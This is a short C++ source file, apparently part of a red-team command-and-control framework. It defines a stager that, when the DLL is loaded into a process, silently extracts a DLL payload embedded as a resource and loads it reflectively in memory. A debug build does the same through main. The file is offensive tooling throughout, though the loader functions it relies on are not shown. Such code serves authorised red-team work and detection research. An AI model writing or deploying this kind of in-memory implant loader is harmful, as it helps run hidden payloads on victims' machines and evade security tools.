#include "StdAfx.h"
#include "AccessPayload.h"
#include "QuietAbort.h"
#include "LoadPe.h"

/// Execute dll embedded as a resource [see ResourceGenerator]
/// @param baseAddress of this Module
void ExecResource(void* baseAddress)
{
	FSECURE_SET_QUIET_ABORT(
		if (auto resource = FindStartOfResource(baseAddress))
		{
			auto dllData = GetPayload(resource);
			auto exportFunc = GetExportName(resource);
			FSecure::Loader::LoadPe(dllData, exportFunc);
		}
	);
}

#ifdef NDEBUG
/// Entry point for this module. Executes the embedded resource on process attach
BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID)
{
	// Indicate successful load of the library.
	if (reason == DLL_PROCESS_ATTACH)
		ExecResource(instance);

	return TRUE;
}
#else

/// Debug version of entry point, executes the embedded resource
int main()
{
	ExecResource(GetModuleHandle(NULL));
}
#endif
